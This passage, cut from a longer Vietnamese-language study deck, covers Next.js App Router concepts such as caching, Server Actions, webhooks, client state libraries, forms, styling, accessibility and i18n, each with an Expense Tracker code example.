x: "Header của Expense Tracker có lời chào theo giờ hiện tại và tên user lấy từ cookie, phần còn lại của layout nên nằm trong static shell:<pre>import { connection } from 'next/server';\n\nexport default function AppLayout({ children }: { children: React.ReactNode }) {\n  return (\n    &lt;&gt;\n      &lt;header&gt;&lt;Logo /&gt;\n        &lt;Suspense fallback={null}&gt;&lt;Greeting /&gt;&lt;/Suspense&gt;\n        &lt;Suspense fallback={&lt;AvatarSkeleton /&gt;}&gt;&lt;UserBadge /&gt;&lt;/Suspense&gt;&lt;/header&gt;\n      {children}\n    &lt;/&gt;\n  );\n}\nasync function Greeting() { await connection(); return &lt;span&gt;{greetingFor(new Date())}&lt;/span&gt;; }\nasync function UserBadge() { const u = await getCurrentUser(); return &lt;span&gt;{u.name}&lt;/span&gt;; }</pre><code>UserBadge</code> đọc <code>cookies()</code> nên tự được đánh dấu chạy lúc request; <code>Greeting</code> chỉ dùng giờ nên cần <code>connection()</code>."
},
"w3k4": {
c: "<code>'use cache: private'</code> cho phép cache hàm có đọc <code>cookies()</code>, <code>headers()</code>, <code>searchParams</code>; kết quả chỉ được dedupe trong request và giữ trong bộ nhớ trình duyệt, không lưu ở server. <code>'use cache: remote'</code> lưu kết quả vào cache handler dùng chung (Redis, KV) cho mọi instance.",
e: "<ul><li><b>'use cache'</b> mặc định lưu trong bộ nhớ của từng instance. Trên serverless, bộ nhớ không chia sẻ và thường mất sau request, nên cache lúc runtime ít khi hit; nó vẫn có giá trị cho static shell và thời gian stale phía client.</li><li><b>'use cache: remote'</b>: bền và dùng chung giữa các instance, đổi lại tốn hạ tầng và thêm độ trễ lookup. Hợp với API bị rate limit, DB chậm, phép tính đắt nằm ngoài shell. Nên chọn cache key có ít giá trị (theo danh mục, ngôn ngữ) thay vì theo từng user. Storage cấu hình qua <code>cacheHandlers</code>; nền tảng như Vercel cung cấp sẵn.</li><li><b>'use cache: private'</b>: cho dữ liệu cá nhân hóa khi không tách được phần đọc runtime ra ngoài, hoặc khi quy định không cho lưu dữ liệu user ở server cache. Không vào static shell, không gắn cache handler được.</li><li><b>Chỉ sống trong một deployment</b>: cache key chứa <code>deploymentId</code> hoặc <code>buildId</code>, nên mỗi lần deploy bắt đầu với cache rỗng, kể cả remote. Cần dữ liệu sống qua deploy thì dùng <code>fetch</code> cache hoặc <code>unstable_cache</code>.</li></ul>",
x: "Expense Tracker gọi API tỷ giá giới hạn 1.000 request/ngày. Mỗi instance serverless mới và mỗi lần deploy đều bắt đầu với cache in-memory trống, nên quota cạn vào giờ cao điểm. Chuyển sang remote cache theo cặp tiền tệ (rất ít giá trị):<pre>async function getFxRate(from: string, to: string) {\n  'use cache: remote';\n  cacheLife({ expire: 3600 });\n  cacheTag(`fx:${from}-${to}`);\n  const res = await fetch(`https://fx.example.com/rate?from=${from}&amp;to=${to}`);\n  return (await res.json()) as { rate: number };\n}\n\nasync function getSpendingTips() {\n  'use cache: private';\n  cacheLife({ stale: 300 });\n  const plan = (await cookies()).get('plan')?.value ?? 'free';\n  return tipsFor(plan);\n}</pre>Nhớ báo trước với team: sau mỗi lần deploy, entry cũ không còn dùng được, nên request đầu tiên sẽ gọi API thật."
},
"w3k5": {
c: "Server Action là hàm async chạy trên server, được đánh dấu bằng <code>'use server'</code> (ở đầu file hoặc đầu hàm), mà client gọi được như một hàm thông qua request POST; thường dùng cho mutation như submit form, xóa, cập nhật.",
e: "Truyền action vào <code>&lt;form action={fn}&gt;</code> thì hàm nhận <code>FormData</code>, và form chạy được cả khi JavaScript chưa tải. Khi dùng với <code>useActionState</code>, action có chữ ký <code>(prevState, formData)</code> và trả state mới (lỗi validate, thông báo). Có thể gọi action từ event handler, bọc trong <code>startTransition</code>. Nếu action gọi <code>updateTag</code>, <code>revalidatePath</code> hoặc <code>refresh</code>, một round trip trả về cả kết quả lẫn UI đã cập nhật. <b>Redirect sau mutation</b>: <code>redirect()</code> hoạt động bằng cách ném một lỗi đặc biệt, nên gọi nó ở cuối, ngoài <code>try/catch</code>, sau khi đã invalidate cache. Lưu ý: client gửi các action lần lượt từng cái, nên không dùng action để đọc dữ liệu song song; giá trị trả về được serialize, chỉ trả thứ UI cần; và action là endpoint public, phải tự xác thực, kiểm quyền, validate.",
x: "Action thêm giao dịch của Expense Tracker: validate bằng zod, lưu, cập nhật cache rồi chuyển về danh sách:<pre>'use server';\nexport async function addTransaction(_prev: FormState, formData: FormData): Promise&lt;FormState&gt; {\n  const { userId } = await verifySession();\n  const raw = Object.fromEntries(formData);\n  const parsed = TxSchema.safeParse(raw);\n  if (!parsed.success) {\n    return { errors: z.flattenError(parsed.error).fieldErrors, values: raw };\n  }\n  await db.tx.create({ data: { ...parsed.data, userId } });\n  updateTag(`summary:${userId}`);\n  redirect('/transactions');\n}</pre>Nếu bọc <code>redirect</code> trong <code>try/catch</code>, khối catch sẽ nuốt mất lệnh chuyển trang. Trả lại <code>values</code> khi lỗi để form không mất dữ liệu người dùng đã nhập."
},
"w3k6": {
c: "Bốn API làm mới dữ liệu theo yêu cầu (từ <code>next/cache</code>): <code>revalidateTag</code> đánh dấu stale theo tag, <code>updateTag</code> cho hết hạn ngay theo tag, <code>revalidatePath</code> invalidate theo đường dẫn, còn <code>refresh</code> chỉ làm mới router phía client.",
e: "<ul><li><b>revalidateTag(tag, profile)</b>: stale-while-revalidate; request tiếp theo vẫn nhận bản cũ và kích hoạt việc tạo bản mới ở nền. Từ Next.js 16 cần tham số thứ hai, khuyến nghị <code>'max'</code>; dùng <code>{ expire: 0 }</code> nếu cần hết hạn ngay mà không dùng được <code>updateTag</code>. Gọi được trong Server Action và Route Handler (webhook). Dạng một tham số đã deprecated.</li><li><b>updateTag(tag)</b>: chỉ dùng trong Server Action; cho hết hạn và làm mới ngay trong cùng request để người vừa sửa thấy dữ liệu của chính mình (read-your-own-writes).</li><li><b>revalidatePath(path)</b>: khi không có tag phù hợp; bên dưới nó dùng một tag ngầm của trang. Docs khuyên ưu tiên tag vì chính xác hơn.</li><li><b>refresh()</b>: chỉ dùng trong Server Action; không đụng tới server cache, chỉ làm router tải lại dữ liệu không cache của trang hiện tại.</li></ul>Gọi bất kỳ API nào trong số này từ Server Action cũng xóa ngay client cache của router.",
x: "Hai tình huống trong Expense Tracker:<pre>// 1. User tự thêm giao dịch: phải thấy ngay số tổng mới\n'use server';\nexport async function addTx(fd: FormData) {\n  const { userId } = await verifySession();\n  /* ...validate + insert... */\n  updateTag(`summary:${userId}`);\n}\n\n// 2. Ngân hàng gọi webhook: chấp nhận trễ vài giây\nexport async function POST(req: Request) {\n  const event = await verifyAndParse(req);\n  revalidateTag(`summary:${event.userId}`, 'max');\n  return Response.json({ ok: true });\n}</pre>Tình huống thứ ba: đánh dấu thông báo đã đọc, badge số thông báo không được cache, chỉ cần <code>refresh()</code>. Câu hỏi hay gặp: vì sao webhook không dùng <code>updateTag</code>? Vì nó chỉ chạy trong Server Action, còn webhook là Route Handler."
},
"w3k7": {
c: "Route Handler là file <code>route.ts</code> trong <code>app/</code>, export các hàm theo HTTP method (<code>GET</code>, <code>POST</code>, <code>PUT</code>, <code>DELETE</code>...) nhận Web <code>Request</code> và trả Web <code>Response</code>; đây là endpoint HTTP thật của ứng dụng.",
e: "Dùng Route Handler thay cho Server Action khi bên gọi không phải UI React của chính app: webhook (Stripe, ngân hàng), mobile app hoặc bên thứ ba cần REST/JSON ổn định, endpoint GET cần cache hoặc CDN, tải file, streaming (SSE), OAuth callback, CORS. Server Action gắn với component, có ID thay đổi theo build và chỉ nhận POST, nên không hợp làm API công khai. Trong cùng một thư mục không được có cả <code>route.ts</code> và <code>page.tsx</code>. Với webhook: đọc body thô bằng <code>await req.text()</code> để kiểm tra chữ ký HMAC trước khi parse JSON; xử lý idempotent theo event id vì nhà cung cấp có thể gửi lại; trả 2xx nhanh rồi đẩy việc nặng ra sau bằng <code>after()</code> hoặc queue. Handler GET mặc định không cache; với Cache Components, cache bằng cách gọi một hàm <code>'use cache'</code> bên trong handler.",
x: "Lab tuần 3: ngân hàng gửi webhook khi tài khoản có biến động:<pre>// app/api/webhooks/bank/route.ts\nimport { revalidateTag } from 'next/cache';\nimport { after } from 'next/server';\n\nexport async function POST(req: Request) {\n  const raw = await req.text();\n  const sig = req.headers.get('x-bank-signature') ?? '';\n  if (!verifyHmac(raw, sig, process.env.BANK_WEBHOOK_SECRET!)) return new Response('invalid signature', { status: 401 });\n  const event = JSON.parse(raw) as BankEvent;\n  if (await alreadyProcessed(event.id)) return Response.json({ ok: true });\n  await saveTransaction(event);\n  revalidateTag(`summary:${event.userId}`, 'max');\n  after(() =&gt; notifyUser(event.userId));\n  return Response.json({ ok: true });\n}</pre>So sánh chữ ký nên dùng <code>crypto.timingSafeEqual</code> để tránh tấn công dựa trên thời gian."
},
"w3k8": {
c: "Trước Cache Components, App Router cache dựa trên option của <code>fetch</code> (<code>cache</code>, <code>next.revalidate</code>, <code>next.tags</code>), route segment config (<code>export const revalidate</code>, <code>dynamic</code>, <code>fetchCache</code>) và <code>unstable_cache</code>; nhiều codebase hiện tại vẫn dùng mô hình này.",
e: "<ul><li><b>Next.js 13/14</b>: <code>fetch</code> được cache mặc định, route tĩnh mặc định; chỉ cần đọc <code>cookies()</code> hoặc <code>headers()</code> là cả route thành dynamic.</li><li><b>Next.js 15</b>: <code>fetch</code> và handler GET không còn cache mặc định; muốn cache thì đặt <code>cache: 'force-cache'</code> hoặc <code>next.revalidate</code>.</li><li><b>Segment config</b>: <code>revalidate = 3600</code> (ISR cho cả route), <code>dynamic = 'force-dynamic'</code> (luôn render lúc request), <code>'force-static'</code> (ép prerender, runtime API trả về rỗng), <code>'error'</code> (build lỗi nếu có phần dynamic), <code>fetchCache</code> (ép option cache cho mọi fetch).</li><li><b>Chuyển sang Cache Components</b>: <code>force-dynamic</code> và <code>revalidate = 0</code> thì xóa; <code>revalidate</code> lớn hơn 0 thành <code>'use cache'</code> + <code>cacheLife</code>; <code>next.tags</code> thành <code>cacheTag</code>; <code>force-static</code> thành <code>'use cache'</code>, có thể thêm <code>ensureStatic</code> (16.4); <code>unstable_cache</code> vẫn chạy. Bật <code>cacheComponents</code> mà còn <code>dynamic</code>, <code>revalidate</code>, <code>fetchCache</code> hay <code>dynamicParams</code> thì build lỗi.</li></ul>",
x: "Câu hỏi khi đọc codebase Next.js 14 trong buổi phỏng vấn: trang sản phẩm có <code>export const revalidate = 60</code> nhưng vẫn render ở mọi request. Nguyên nhân: layout đọc <code>cookies()</code> để lấy theme, khiến cả route thành dynamic và bỏ qua ISR. Trong mô hình cũ, sửa bằng cách bỏ việc đọc cookie ở layout (xử lý theme ở client); trong mô hình mới, tách phần đọc cookie vào Suspense.<pre>// Cũ\nexport const revalidate = 3600;\nconst res = await fetch(url, { next: { revalidate: 3600, tags: ['categories'] } });\n\n// Mới (cacheComponents: true)\nasync function getCategories() {\n  'use cache';\n  cacheLife('hours');\n  cacheTag('categories');\n  return (await fetch(url)).json();\n}</pre>Khác biệt cần nhớ: Data Cache của <code>fetch</code> và <code>unstable_cache</code> sống qua các lần deploy, còn <code>'use cache'</code> thì không."
},
"w4k0": {
c: "“URL là state” nghĩa là đặt những trạng thái quyết định nội dung trang như bộ lọc, sắp xếp, trang hiện tại, tab vào <code>searchParams</code> của URL, thay vì giữ trong <code>useState</code> hay store.",
e: "Lợi ích: chia sẻ và bookmark được link đúng trạng thái; nút back/forward hoạt động; server đọc <code>searchParams</code> để truy vấn và render đúng ngay từ đầu, không có cảnh hiện dữ liệu mặc định rồi mới lọc; và không phải đồng bộ hai nguồn sự thật. Ở client, đọc bằng <code>useSearchParams</code>, cập nhật bằng <code>router.replace</code> với <code>scroll: false</code> (dùng <code>replace</code> thay <code>push</code> cho ô tìm kiếm để không làm đầy lịch sử), và debounce ô gõ. Ở server, <code>searchParams</code> là Promise và luôn là dữ liệu không tin cậy: parse và validate bằng zod, có giá trị mặc định, giới hạn <code>pageSize</code>. Với Cache Components, component đọc <code>searchParams</code> phải nằm trong Suspense; truyền giá trị đã parse vào hàm <code>'use cache'</code> thì mỗi bộ lọc là một cache entry, nên chỉ cache theo chiều có ít giá trị. Phân trang dữ liệu lớn nên dùng cursor thay vì offset. Thư viện như nuqs giúp quản lý query state có type.",
x: "Trang <code>/transactions?month=2026-10&amp;cat=food&amp;sort=-amount&amp;page=2</code>:<pre>const Query = z.object({\n  month: z.string().regex(/^\\d{4}-\\d{2}$/).optional(),\n  cat: z.enum(['food', 'rent', 'transport']).optional(),\n  sort: z.enum(['date', '-date', 'amount', '-amount']).default('-date'),\n  page: z.coerce.number().int().min(1).max(500).default(1),\n});\n\nexport default function Page({ searchParams }: PageProps&lt;'/transactions'&gt;) {\n  return &lt;Suspense fallback={&lt;ListSkeleton /&gt;}&gt;&lt;Results searchParams={searchParams} /&gt;&lt;/Suspense&gt;;\n}\nasync function Results({ searchParams }: Pick&lt;PageProps&lt;'/transactions'&gt;, 'searchParams'&gt;) {\n  const parsed = Query.safeParse(await searchParams);\n  const q = parsed.success ? parsed.data : Query.parse({});\n  return &lt;TxTable rows={await listTx(q)} /&gt;;\n}</pre>Link sang trang 3 chỉ cần tạo <code>href</code> mới từ query hiện tại với <code>page=3</code>; server render đúng trang ngay ở lần tải đầu."
},
"w4k1": {
c: "TanStack Query là thư viện quản lý server state ở client (fetch, cache, refetch, retry, mutation). Trong App Router nó không còn là lựa chọn mặc định, chỉ dùng khi client thật sự cần tự quản lý dữ liệu server; có thể prefetch trên server rồi chuyển cache xuống client bằng <code>HydrationBoundary</code>.",
e: "App Router đã lo phần lớn việc: đọc dữ liệu ở Server Component, mutation bằng Server Action, cache bằng <code>'use cache'</code>. Nên đưa TanStack Query vào khi client cần: polling hoặc refetch khi quay lại tab, infinite scroll, optimistic update phức tạp có rollback, dữ liệu dùng chung giữa nhiều widget client với invalidation chi tiết, gọi API ngoài trực tiếp từ trình duyệt, hoặc màn hình có tính tương tác rất cao. Pattern SSR: trong Server Component tạo <code>QueryClient</code>, <code>await queryClient.prefetchQuery(...)</code>, rồi bọc Client Component bằng <code>&lt;HydrationBoundary state={dehydrate(queryClient)}&gt;</code>; client gọi <code>useQuery</code> với cùng <code>queryKey</code> sẽ có dữ liệu ngay. Lưu ý: trên server tạo QueryClient mới cho mỗi request, không dùng biến global; ở trình duyệt chỉ dùng một instance; đặt <code>staleTime</code> lớn hơn 0 để client không refetch ngay sau khi hydrate; tránh để cùng một dữ liệu vừa render ở Server Component vừa nằm trong query cache, vì rất dễ lệch nhau.",
x: "Trang “Hoạt động gần đây” của Expense Tracker cần infinite scroll và tự refetch mỗi 30 giây. Trang đầu tiên được prefetch ở server:<pre>// page.tsx (Server Component)\nexport default async function Page() {\n  const qc = new QueryClient();\n  await qc.prefetchInfiniteQuery({\n    queryKey: ['activity'],\n    queryFn: ({ pageParam }) =&gt; fetchActivity(pageParam),\n    initialPageParam: null as string | null,\n  });\n  return (\n    &lt;HydrationBoundary state={dehydrate(qc)}&gt;\n      &lt;ActivityFeed /&gt; {/* useInfiniteQuery cùng queryKey, refetchInterval: 30_000 */}\n    &lt;/HydrationBoundary&gt;\n  );\n}</pre>Provider phía client tạo QueryClient một lần bằng <code>useState(() =&gt; new QueryClient({ defaultOptions: { queries: { staleTime: 60_000 } } }))</code>."
},
"w4k2": {
c: "Zustand và Redux Toolkit là thư viện state dùng chung cho client. Trong App Router, store phải được tạo theo từng request trên server (và một lần trong trình duyệt) thông qua một Client Component provider, không khai báo store như biến module dùng chung.",
e: "Trên server, một module được nạp một lần rồi dùng chung cho mọi request đồng thời. Store tạo bằng <code>create()</code> ở module scope mà bị ghi dữ liệu của user trong lúc SSR có thể rò sang request của người khác. Cách làm theo hướng dẫn chính thức của cả Zustand và Redux: viết hàm <code>createStore(initial)</code>; trong provider <code>'use client'</code> tạo store đúng một lần bằng <code>useState(() =&gt; createStore(...))</code> hoặc <code>useRef</code>; đưa store xuống qua Context; component đọc bằng <code>useStore(store, selector)</code>. Dữ liệu khởi tạo đến từ Server Component qua props của provider, còn Server Component thì không đọc được store. Chỉ dùng store cho state client thật sự dùng chung (giỏ hàng, wizard nhiều bước, editor, chọn nhiều dòng); đừng copy dữ liệu server vào store rồi tự đồng bộ. Redux Toolkit hợp với team lớn cần devtools, middleware và quy ước chặt; Zustand gọn và ít boilerplate hơn.",
x: "Expense Tracker có wizard “Nhập sao kê” ba bước (chọn file, map cột, xác nhận) dùng chung state:<pre>// stores/import-store.ts\nexport const createImportStore = (init: Partial&lt;ImportState&gt; = {}) =&gt;\n  createStore&lt;ImportState&gt;()((set) =&gt; ({\n    step: 1, rows: [], ...init,\n    next: () =&gt; set((s) =&gt; ({ step: s.step + 1 })),\n  }));\n\n// providers/import-provider.tsx\n'use client';\nconst Ctx = createContext&lt;ReturnType&lt;typeof createImportStore&gt; | null&gt;(null);\nexport function ImportProvider({ children }: { children: React.ReactNode }) {\n  const [store] = useState(() =&gt; createImportStore());\n  return &lt;Ctx value={store}&gt;{children}&lt;/Ctx&gt;;\n}\nexport const useImport = &lt;T,&gt;(sel: (s: ImportState) =&gt; T) =&gt; useStore(use(Ctx)!, sel);</pre><code>createStore</code> lấy từ <code>zustand/vanilla</code>, <code>useStore</code> từ <code>zustand</code>. Mỗi request SSR và mỗi tab trình duyệt có store riêng."
},
"w4k3": {
c: "react-hook-form quản lý form phía client bằng input uncontrolled nên ít render lại; zod định nghĩa schema vừa để validate vừa để sinh type. Dùng chung một schema cho client và server: lỗi hiện nhanh ở trình duyệt, còn server vẫn là chốt chặn cuối cùng.",
e: "Validate ở client chỉ để trải nghiệm tốt hơn (báo lỗi ngay khi rời ô, không chờ round trip). Ai cũng có thể bỏ qua client và gửi request thẳng, nên Server Action hoặc Route Handler phải <code>safeParse</code> lại với cùng schema. Kết nối hai thư viện bằng <code>zodResolver(schema)</code> từ <code>@hookform/resolvers/zod</code>; type của form lấy từ schema (lưu ý <code>z.coerce</code> làm kiểu input và output khác nhau). Lỗi chỉ server mới biết (trùng dữ liệu, vượt hạn mức) thì trả về rồi gắn vào field bằng <code>setError</code>. <b>Giữ giá trị khi lỗi</b>: với react-hook-form, giá trị nằm trong state của form nên không mất; với form thuần dùng <code>useActionState</code>, React reset các field uncontrolled sau khi action chạy, nên action phải trả lại giá trị đã gửi để làm <code>defaultValue</code>. Cách chọn: form đơn giản thì Server Action + <code>useActionState</code> (chạy được khi chưa có JS); form nhiều bước, field động, validate phức tạp thì react-hook-form.",
x: "Form thêm giao dịch dùng chung schema giữa client và server:<pre>// lib/schemas.ts\nexport const TxSchema = z.object({\n  amount: z.coerce.number().int().positive('Số tiền phải lớn hơn 0'),\n  category: z.enum(['food', 'rent', 'transport']),\n  note: z.string().max(200).optional(),\n});\n\n// add-tx-form.tsx\n'use client';\nconst form = useForm({ resolver: zodResolver(TxSchema) });\nasync function onSubmit(values: z.output&lt;typeof TxSchema&gt;) {\n  const res = await createTransaction(values); // Server Action safeParse lại\n  if (res?.errors?.amount) form.setError('amount', { message: res.errors.amount[0] });\n}\n// &lt;form onSubmit={form.handleSubmit(onSubmit)}&gt;...</pre>Test nên có: gửi thẳng request với <code>amount: -5</code>, bỏ qua UI, và kiểm tra server từ chối."
},
"w4k4": {
c: "<code>useOptimistic</code> là hook của React 19 cho phép hiển thị ngay kết quả dự kiến của một thao tác trong lúc Action đang chạy, rồi tự quay về giá trị thật khi Action kết thúc.",
e: "<code>const [optimistic, addOptimistic] = useOptimistic(state, (current, input) =&gt; next)</code>. Gọi <code>addOptimistic</code> bên trong Action (form action hoặc <code>startTransition</code>); khi transition xong, React bỏ giá trị tạm và render theo <code>state</code> thật, thường là props mới từ server sau khi action gọi <code>updateTag</code> hoặc <code>refresh</code>. Nếu action lỗi, giá trị tạm tự biến mất, đó chính là rollback, nhưng bạn vẫn phải báo lỗi cho người dùng. Hợp với thao tác nhanh và gần như luôn thành công: thêm hoặc xóa giao dịch, thích, đánh dấu đã đọc. Không nên dùng cho thanh toán hay chuyển tiền, nơi người dùng cần biết chắc kết quả. Mẹo: đánh dấu item tạm bằng <code>pending: true</code> để hiển thị mờ, và tạo id tạm ở client để làm key. Gọi <code>addOptimistic</code> ngoài transition thì React cảnh báo và giá trị tạm hiện lên rồi mất ngay.",
x: "Lab tuần 4: giao dịch mới hiện ngay ở đầu danh sách, mờ đi cho tới khi server xác nhận:<pre>'use client';\ntype Row = Tx &amp; { pending?: boolean };\nexport function TxList({ txs }: { txs: Row[] }) {\n  const [items, addItem] = useOptimistic(txs, (cur, tx: Row) =&gt; [{ ...tx, pending: true }, ...cur]);\n  async function action(fd: FormData) {\n    addItem({ id: crypto.randomUUID(), amount: Number(fd.get('amount')), note: String(fd.get('note')) } as Row);\n    const res = await createTransaction(fd); // server gọi updateTag\n    if (res?.error) toast.error(res.error);\n  }\n  return (&lt;&gt;\n    &lt;form action={action}&gt;{/* inputs */}&lt;/form&gt;\n    {items.map((t) =&gt; &lt;TxRow key={t.id} tx={t} dim={t.pending} /&gt;)}\n  &lt;/&gt;);\n}</pre>Nếu server lỗi, dòng mờ tự biến mất khi action kết thúc và toast báo lỗi cho người dùng."
},
"w4k5": {
c: "Tailwind CSS v4 là framework utility-first cấu hình bằng chính CSS (<code>@import 'tailwindcss'</code>, <code>@theme</code>) thay cho <code>tailwind.config.js</code>; CSS Modules là file <code>.module.css</code> có class được scope cục bộ; shadcn/ui là bộ component được copy thẳng vào repo, dựng trên Tailwind và primitive có sẵn accessibility.",
e: "<ul><li><b>Tailwind v4</b> (01/2025): engine mới build nhanh hơn nhiều, tự phát hiện file nguồn; token khai báo trong <code>@theme</code> vừa sinh utility (<code>bg-brand</code>) vừa trở thành CSS variable dùng được ở mọi nơi. Với Next.js dùng plugin <code>@tailwindcss/postcss</code>. Biến thể tùy biến khai báo bằng <code>@custom-variant</code>, ví dụ dark mode theo class.</li><li><b>CSS Modules</b>: hợp với component có style phức tạp (animation, selector lồng) hoặc team không dùng Tailwind; không cần runtime.</li><li><b>shadcn/ui</b>: không phải thư viện npm khóa phiên bản; CLI chép code vào <code>components/ui</code>, bạn sở hữu và sửa trực tiếp. Đổi lại, nâng cấp phải tự làm.</li></ul>Trong App Router nên ưu tiên giải pháp không cần runtime (Tailwind, CSS Modules, global CSS). CSS-in-JS chạy lúc runtime (styled-components, Emotion) cần Client Component và style registry riêng, làm tăng JS phía client. Ghép class có điều kiện thường dùng <code>clsx</code> + <code>tailwind-merge</code> qua hàm <code>cn</code>.",
x: "Thiết lập token màu cho Expense Tracker và dark mode theo class:<pre>/* app/globals.css */\n@import 'tailwindcss';\n@custom-variant dark (&amp;:where(.dark, .dark *));\n\n@theme {\n  --color-income: oklch(0.72 0.17 150);\n  --color-expense: oklch(0.63 0.22 25);\n  --font-sans: var(--font-inter), system-ui, sans-serif;\n}</pre>Sau đó viết <code>&lt;span className='text-expense dark:text-red-300'&gt;</code>. Bảng giao dịch có sticky header và animation phức tạp thì để trong <code>table.module.css</code>; nút, dialog, combobox lấy từ shadcn/ui (<code>npx shadcn@latest add dialog</code>) rồi chỉnh theo design token của dự án."
},
"w4k6": {
c: "Design system là tập quy tắc, design token và component dùng chung giúp UI nhất quán; design token là giá trị thiết kế có tên (màu, khoảng cách, bo góc, font) dùng thay cho giá trị viết cứng; Storybook là môi trường phát triển và tài liệu hóa component tách biệt khỏi app.",
e: "Token nên chia tầng: <b>primitive</b> (<code>blue-600</code>) và <b>semantic</b> (<code>--color-primary</code>, <code>--color-surface</code>, <code>--color-danger</code>). Component chỉ dùng token semantic, nên dark mode hay đổi thương hiệu chỉ cần đổi giá trị của tầng semantic. Dark mode: dựa trên <code>prefers-color-scheme</code> và cho người dùng ghi đè bằng class hoặc attribute trên <code>&lt;html&gt;</code>; để tránh nháy sáng khi tải trang, đặt attribute bằng một script nhỏ chạy trước khi paint thay vì chờ hydrate. <b>Storybook</b>: mỗi story là một trạng thái của component (mặc định, loading, lỗi, disabled, nội dung dài); dùng để review với designer, chạy test tương tác, kiểm tra accessibility (addon a11y) và visual regression (Chromatic). Storybook chạy component như ở client, nên component phụ thuộc <code>next/navigation</code> hay dữ liệu server cần mock. Sai lầm hay gặp: dựng design system quá sớm khi sản phẩm còn đổi liên tục, hoặc có token nhưng code vẫn dùng mã màu viết cứng.",
x: "Component <code>MoneyAmount</code> của Expense Tracker hiển thị số tiền thu/chi. Story giúp designer duyệt mọi trạng thái mà không cần dữ liệu thật:<pre>// money-amount.stories.tsx\nconst meta = { component: MoneyAmount } satisfies Meta&lt;typeof MoneyAmount&gt;;\nexport default meta;\ntype Story = StoryObj&lt;typeof meta&gt;;\n\nexport const Income: Story = { args: { value: 1250000, kind: 'income' } };\nexport const Expense: Story = { args: { value: -45000, kind: 'expense' } };\nexport const Huge: Story = { args: { value: 999999999999, kind: 'income' } };\nexport const Dark: Story = { ...Income, globals: { theme: 'dark' } };</pre>Component chỉ dùng <code>text-income</code>/<code>text-expense</code> (token semantic), nên khi bật dark mode chỉ cần đổi giá trị biến trong selector <code>.dark</code>, không phải sửa component. Story <code>Huge</code> bắt được lỗi tràn chữ trên mobile trước khi lên production."
},
"w4k7": {
c: "Accessibility (a11y) là làm cho giao diện dùng được với mọi người, kể cả người dùng bàn phím, trình đọc màn hình hay thị lực kém; ARIA Authoring Practices Guide (APG) mô tả cách làm đúng vai trò, trạng thái và phím tắt cho các widget phức tạp như combobox, dialog.",
e: "<ul><li><b>Label</b>: input nào cũng cần <code>&lt;label htmlFor&gt;</code> (placeholder không thay được label); nút chỉ có icon cần <code>aria-label</code>; thông báo lỗi nối với input qua <code>aria-describedby</code>, kèm <code>aria-invalid</code>.</li><li><b>Focus</b>: không xóa outline mà không có thay thế (dùng <code>:focus-visible</code>); thứ tự tab theo thứ tự DOM; sau khi điều hướng hoặc đóng dialog, đưa focus về chỗ hợp lý.</li><li><b>Bàn phím</b>: ưu tiên phần tử native (<code>button</code>, <code>a</code>, <code>select</code>); <code>div onClick</code> không nhận focus và không phản ứng với Enter.</li><li><b>Dialog</b> theo APG: <code>role='dialog'</code>, <code>aria-modal</code>, tiêu đề qua <code>aria-labelledby</code>, focus vào trong khi mở, giữ focus bên trong, Escape để đóng, trả focus về nút đã mở. Thẻ <code>&lt;dialog&gt;</code> với <code>showModal()</code> lo phần lớn việc này.</li><li><b>Combobox</b> theo APG: input có <code>role='combobox'</code>, <code>aria-expanded</code>, <code>aria-controls</code> trỏ tới <code>listbox</code>, <code>aria-activedescendant</code> trỏ option đang chọn; mũi tên lên/xuống, Enter để chọn, Escape để đóng.</li></ul>Quy tắc đầu tiên của ARIA: phần tử native làm được thì không dùng ARIA.",
x: "Lab tuần 4 yêu cầu Combobox chọn danh mục chạy được bằng bàn phím. Khung tối thiểu theo APG:<pre>&lt;label id='cat-label' htmlFor='cat'&gt;Danh mục&lt;/label&gt;\n&lt;input id='cat' role='combobox' aria-expanded={open} aria-controls='cat-list'\n  aria-autocomplete='list' aria-activedescendant={open ? `cat-${active}` : undefined}\n  onKeyDown={onKeyDown} value={query} onChange={(e) =&gt; setQuery(e.target.value)} /&gt;\n{open &amp;&amp; (\n  &lt;ul id='cat-list' role='listbox' aria-labelledby='cat-label'&gt;\n    {options.map((o, i) =&gt; (\n      &lt;li key={o.id} id={`cat-${i}`} role='option' aria-selected={i === active}\n        onMouseDown={(e) =&gt; { e.preventDefault(); select(o); }}&gt;{o.label}&lt;/li&gt;\n    ))}\n  &lt;/ul&gt;\n)}</pre><code>onKeyDown</code> xử lý ArrowDown/ArrowUp (đổi <code>active</code>), Enter (chọn) và Escape (đóng). Kiểm tra bằng cách bỏ chuột ra và thử với VoiceOver hoặc NVDA; dự án thật nên ưu tiên primitive có sẵn như Radix hay React Aria."
},
"w4k8": {
c: "i18n (internationalization) là chuẩn bị app để hiển thị nhiều ngôn ngữ và định dạng theo vùng; next-intl là thư viện i18n phổ biến cho App Router, còn <code>next/root-params</code> (từ 16.3) cho phép đọc segment gốc như <code>[lang]</code> từ bất kỳ Server Component nào.",
e: "<ul><li><b>Routing</b>: đặt locale trong URL, với <code>app/[lang]/layout.tsx</code> làm root layout, để SEO và link chia sẻ đúng ngôn ngữ; <code>proxy.ts</code> đọc <code>Accept-Language</code> hoặc cookie để chuyển hướng ở lần vào đầu tiên. Khai báo <code>alternates.languages</code> (hreflang) trong metadata.</li><li><b>next-intl</b>: file message theo locale, <code>getTranslations</code> trong Server Component, <code>useTranslations</code> trong Client Component, hỗ trợ cú pháp ICU (số nhiều, biến), có helper điều hướng giữ nguyên locale. Chỉ gửi xuống client phần message mà client cần.</li><li><b>Root params</b>: <code>import { lang } from 'next/root-params'</code> rồi <code>await lang()</code>, không phải truyền <code>params</code> qua nhiều tầng; dùng được trong hàm <code>'use cache'</code> và chỉ tham số đó vào cache key. Không dùng được trong Client Component, Server Action, Route Handler; với Cache Components phải có <code>generateStaticParams</code> trả ít nhất một locale.</li><li><b>Định dạng</b>: tiền dùng <code>Intl.NumberFormat('vi-VN', { style: 'currency', currency: 'VND' })</code> (VND không có phần lẻ), ngày dùng <code>Intl.DateTimeFormat</code> với <code>timeZone</code> cố định để server và client ra cùng một chuỗi.</li></ul>",
